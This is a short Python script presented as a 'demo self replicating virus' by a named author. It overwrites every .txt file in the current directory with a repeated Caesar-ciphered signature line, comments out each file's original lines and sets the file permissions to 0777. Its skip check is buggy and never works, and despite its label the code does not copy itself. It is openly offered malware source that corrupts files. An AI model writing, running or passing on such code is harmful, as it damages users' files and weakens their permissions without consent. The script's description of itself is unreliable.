#! /usr/bin/env python
import sys
import os
import glob
##Demo self replicating virus
#Author : Jaiyeola Tosin(livecity505@gmail.com)
#Date: August 04, 2016
#all it does is copy my ceaser chipered signature into .txt files
IN = open(sys.argv[0], 'r')
for j in range(1, 1000):
    pre_virus = "DOO KDLO KBGUD\n"
    virus = pre_virus * j
for item in glob.glob("*.txt"):
    IN = open(item, 'r')
    all_of_it = IN.readlines()
    IN.close()
    if any(line.find('testvirus') for line in all_of_it): next
    os.chmod(item, 0777)
    OUT = open(item, 'w')
    OUT.writelines(virus)
    all_of_it = ["#"+ line for line in all_of_it]
    OUT.writelines(all_of_it)
    OUT.close()
    
